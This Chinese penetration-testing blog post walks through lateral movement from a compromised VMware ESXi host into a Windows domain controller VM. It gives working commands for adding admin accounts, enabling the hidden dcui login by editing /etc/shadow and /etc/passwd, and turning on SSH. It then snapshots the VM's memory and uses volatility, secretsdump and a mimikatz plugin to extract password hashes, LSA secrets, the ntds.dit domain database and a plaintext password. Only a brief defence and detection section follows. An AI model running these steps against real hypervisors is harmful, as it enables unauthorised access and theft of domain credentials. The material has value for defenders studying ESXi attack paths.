---
layout: post
title: 渗透技巧——从VMware ESXI横向移动到Windows虚拟机
---


## 0x00 前言
---

假定以下测试环境：我们获得了内网VMware ESXI的控制权限，发现VMware ESXI上安装了Windows域控服务器。
本文仅在技术研究的角度介绍从VMware ESXI横向移动到该Windows域控服务器的方法，结合利用思路，给出防御检测的方法。

## 0x02 简介
---

本文将要介绍以下内容：

- 利用思路
- 常用命令
- 实现方法

## 0x03 利用思路
---

通过VMware ESXI管理虚拟机，创建快照文件，从快照文件中提取出有价值的信息。

## 0x04 常用命令
---

### 1.查看虚拟机版本

```
vmware -vl
```

### 2.用户信息相关

#### (1)查看所有用户

```
esxcli system account list
```

#### (2)查看管理员用户

```
esxcli system permission list
```

#### (3)添加用户

```
esxcli system account add -i test1 -p Password@1 -c Password@1
```

#### (4)将普通用户添加成管理员用户

```
esxcli system permission set -i test1 -r Admin
```

#### (5)启用内置管理员账户

默认配置下，`dcui`是管理员用户，但是不允许远程登录，可以通过修改配置文件的方式设置`dcui`用户的口令并启用远程登录

设置`dcui`用户口令为`Ballot5Twist7upset`，依次输入：

```
passwd dcui
Ballot5Twist7upset
Ballot5Twist7upset
```

一键设置dcui用户口令：`sed -i 's/dcui:\*:13358:0:99999:7:::/dcui:$6$NaeURj2m.ZplDfbq$LdmyMwxQ7FKh3DS5V\/zhRQvRvfWzQMSS3wftFwaUsD9IZuxdns.0X.SPx.59bT.kmJOJ\/y3zenTmEcoxDVQsS\/:19160:0:99999:7:::/g' /etc/shadow`

启用dcui用户远程登录:

修改文件`/etc/passwd`，将`dcui:x:100:100:DCUI User:/:/sbin/nologin`修改为`dcui:x:100:100:DCUI User:/:/bin/sh`

一键启用dcui用户远程登录：`sed -i 's/dcui:x:100:100:DCUI User:\/:\/sbin\/nologin/dcui:x:100:100:DCUI User:\/:\/bin\/sh/g' /etc/passwd`

开启ssh：

```
vim-cmd hostsvc/enable_ssh
```

### 3.虚拟机相关

#### (1)查看所有虚拟机

```
vim-cmd vmsvc/getallvms
```

#### (2)查看指定虚拟机的状态

```
vim-cmd vmsvc/power.getstate <vmid>
```

#### (3)开启指定虚拟机，可用于开机和从挂起状态恢复

```
vim-cmd vmsvc/power.on <vmid>
```

#### (4)挂起指定虚拟机

```
vim-cmd vmsvc/power.suspend <vmid>
```

#### (5)关闭指定虚拟机

```
vim-cmd vmsvc/power.off <vmid>
```

#### (6)查看指定虚拟机的操作日志

```
vim-cmd vmsvc/get.tasklist <vmid>
```

### 4.虚拟机快照相关

#### (1)查看指定虚拟机的快照信息

```
vim-cmd vmsvc/get.snapshotinfo <vmid>
```

#### (2)新建快照

```
vim-cmd vmsvc/snapshot.create <vmid> <snapshotName> <description> <includeMemory> <quiesced>
```

示例1：

```
vim-cmd vmsvc/snapshot.create 1 test testsnapshot true true
```

`<includeMemory>`设置为`true`，表示包括内存，否则无法生成.vmem文件

示例2：

```
vim-cmd vmsvc/snapshot.create 1 test
```

这个命令等价于`vim-cmd vmsvc/snapshot.create 1 test "" false false`，不包括内存，不会生成.vmem文件

#### (3)删除快照

```
vim-cmd vmsvc/snapshot.remove <vmid> <snapshotIndex>
```

## 0x05 实现方法
---

### 1.获得虚拟机的vmid

```
vim-cmd vmsvc/getallvms
```

测试环境下，从输出中获得虚拟机Windows域控服务器的`vmid`为`1`

### 2.查看虚拟机的快照信息

```
vim-cmd vmsvc/get.snapshotinfo 1
```

测试环境下没有虚拟机快照

### 3.为虚拟机创建快照

```
vim-cmd vmsvc/snapshot.create 1 test testsnapshot true true
```

测试环境下，从输出中获得虚拟机Windows域控服务器的`snapshotIndex`为`1`

### 4.使用volatility分析快照文件

volatility是一款开源的取证分析软件

Python2版本的地址：https://github.com/volatilityfoundation/volatility

Python3版本的地址：https://github.com/volatilityfoundation/volatility3

volatility和volatility3的命令语法不同，功能基本相同，最新版本为[volatility3](https://github.com/volatilityfoundation/volatility3)，但这里选择[volatility](https://github.com/volatilityfoundation/volatility)，理由如下：

- volatility有独立的可执行程序，volatility3需要自己编译
- volatility3有mimikatz插件，可以从lsass进程提取数据，volatility3不支持这个插件

#### (1)定位镜像文件

搜索后缀名为vmem的文件，命令如下：

```
find -name *.vmem
```

测试环境下，获得镜像文件位置为`./vmfs/volumes/62a735a8-ad916179-40dd-000c296a0829/DC1/DC1-Snapshot1.vmem`

#### (2)上传volatility_2.6_lin64_standalone

volatility_2.6_lin64_standalone的下载地址：

http://downloads.volatilityfoundation.org/releases/2.6/volatility_2.6_lin64_standalone.zip

分析快照文件需要.vmem文件作为参数，而.vmem文件通常很大，为了提高效率，这里选择将volatility上传至VMware ESXI，在VMware ESXI上分析快照文件

#### (3)查看镜像信息

通过镜像信息获得系统版本，命令如下：

```
./volatility_2.6_lin64_standalone -f "./vmfs/volumes/62a735a8-ad916179-40dd-000c296a0829/DC1/DC1-Snapshot1.vmem" imageinfo
```

测试环境下，获得Profile为`Win2016x64_14393`

#### (4)从注册表获得本地用户hash

命令如下：

```
./volatility_2.6_lin64_standalone -f "./vmfs/volumes/62a735a8-ad916179-40dd-000c296a0829/DC1/DC1-Snapshot1.vmem" --profile="Win2016x64_14393" hashdump
```

测试环境下，输出结果：

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58A478135A93AC3BF058A5EA0E8FDB71:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:58A478135A93AC3BF058A5EA0E8FDB71:::
```

#### (5)从注册表读取LSA Secrets

命令如下：

```
./volatility_2.6_lin64_standalone -f "./vmfs/volumes/62a735a8-ad916179-40dd-000c296a0829/DC1/DC1-Snapshot1.vmem" --profile="Win2016x64_14393" lsadump
```

测试环境下，输出结果：

```
NL$KM
0x00000000  40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   @...............
0x00000010  ac ab 06 24 e7 5e 13 ba 5b aa b2 d2 a7 d2 b3 cd   ...$.^..[.......
0x00000020  55 c6 b4 44 cf 9f 72 02 b5 e7 14 66 9e 41 25 35   U..D..r....f.A%5
0x00000030  a1 6b 50 48 82 35 ea e1 f9 2b a3 c6 9e 15 3b 6b   .kPH.5...+....;k
0x00000040  9d 3f 8d 29 1a 1a b8 d2 ff ce ba 49 c0 a7 fd ce   .?.).......I....
0x00000050  7c 7f f5 ec a0 d8 ab a0 75 ea 19 64 b5 af 10 49   |.......u..d...I

DefaultPassword
0x00000000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................
0x00000010  39 ad ef 46 ad 82 f8 a5 41 65 45 0e 5c 93 bf 73   9..F....AeE.\..s

DPAPI_SYSTEM
0x00000000  2c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ,...............
0x00000010  01 00 00 00 d3 63 12 68 2a 9b 93 38 03 79 14 1f   .....c.h*..8.y..
0x00000020  1a 11 c2 19 9e 86 56 4a b8 aa a1 97 a4 4d 24 14   ......VJ.....M$.
0x00000030  18 f7 ae 3e 77 62 64 89 f2 e9 88 f2 00 00 00 00   ...>wbd.........
```

#### (6)导出所有域用户hash

需要下载ntds.dit、SYSTEM文件和SECURITY文件

定位ntds.dit文件，命令如下：

```
./volatility_2.6_lin64_standalone -f "./vmfs/volumes/62a735a8-ad916179-40dd-000c296a0829/DC1/DC1-Snapshot1.vmem" --profile="Win2016x64_14393" filescan |grep ntds.dit
```

输出：

```
0x000000007eff8c20     16      0 R--rw- \Device\HarddiskVolume2\Windows\System32\ntds.dit
```

提取ntds.dit文件，命令如下：

```
./volatility_2.6_lin64_standalone -f "./vmfs/volumes/62a735a8-ad916179-40dd-000c296a0829/DC1/DC1-Snapshot1.vmem" --profile="Win2016x64_14393" dumpfiles -Q 0x000000007eff8c20 --name file -D /tmp/
```

依次再提取出SYSTEM文件和SECURITY文件，导出所有域用户hash可以使用[secretsdump](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py)，命令为：`secretsdump -system SYSTEM -security SECURITY -ntds ntds.dit local`

#### (7)加载mimikatz插件，读取lsass进程中保存的凭据

volatility_2.6_lin64_standalone不支持加载mimikatz插件，这里可以选择将整个快照文件(DC1-Snapshot1.vmem)下载至本地，搭建volatility环境，加载mimikatz插件

kali安装volatility的方法：

1. 安装

```
apt-get install pcregrep libpcre++-dev python2-dev python-pip -y
pip2 install pycrypto
pip2 install distorm3
git clone https://github.com/volatilityfoundation/volatility.git
cd volatility
python2 setup.py install
```

2. 测试volatility

```
python2 vol.py -h
```

3. 添加mimikatz插件

下载地址：https://github.com/volatilityfoundation/community/blob/master/FrancescoPicasso/mimikatz.py

将mimikatz.py保存至`<volatility>/volatility/plugins/`

4. 安装mimikatz插件的依赖

```
pip2 install construct==2.5.5-reupload
```

这里不能直接使用`pip2 install construct`，construct版本过高会导致在加载mimikatz.py时报错`AttributeError: 'module' object has no attribute 'ULInt32'`

5. 测试插件

```
python2 vol.py --info | grep mimikatz
```

输出：

```
Volatility Foundation Volatility Framework 2.6.1
mimikatz                   - mimikatz offline
```

安装成功

加载mimikatz插件的命令如下：

```
python2 vol.py -f "DC1-Snapshot1.vmem" --profile="Win2016x64_14393" mimikatz
```

输出结果：

```
Module   User             Domain           Password                                
-------- ---------------- ---------------- ----------------------------------------
wdigest  admin            DC1              Password@1
```

**补充：**

读取lsass进程中保存的凭据还可以使用以下方法：

1. 将镜像文件转成Crash Dump文件

```
./volatility_2.6_lin64_standalone -f "./vmfs/volumes/62a735a8-ad916179-40dd-000c296a0829/DC1/DC1-Snapshot1.vmem" --profile="Win2016x64_14393" raw2dmp -O copy.dmp
```

2. 使用Mimilib从dump文件中导出口令

详细方法可参考之前的文章[《渗透技巧——使用Mimilib从dump文件中导出口令》](https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BD%BF%E7%94%A8Mimilib%E4%BB%8Edump%E6%96%87%E4%BB%B6%E4%B8%AD%E5%AF%BC%E5%87%BA%E5%8F%A3%E4%BB%A4)

### 5.删除快照

```
vim-cmd vmsvc/snapshot.remove 1 5
```

## 0x06 防御检测

### 1. 防御

内网VMware ESXI及时更新补丁

关闭内网VMware ESXI的ssh登录功能

### 2. 检测

查看内网VMware ESXI登录日志

查看虚拟机快照镜像标志`snapshotIndex`是否异常，对于新的虚拟机，新建快照标志`snapshotIndex`从`1`开始累加，删除快照镜像`不会影响`snapshotIndex`，例如删除`snapshotIndex`为`1`的快照，再次创建快照时`snapshotIndex`为`2`

## 0x07 小结
---

本文在技术研究的角度介绍了从VMware ESXI横向移动到该Windows域控服务器的方法，使用volatility分析镜像文件，提取关键信息，结合利用思路，给出防御检测的方法。。


---


[LEAVE A REPLY](https://github.com/3gstudent/feedback/issues/new)







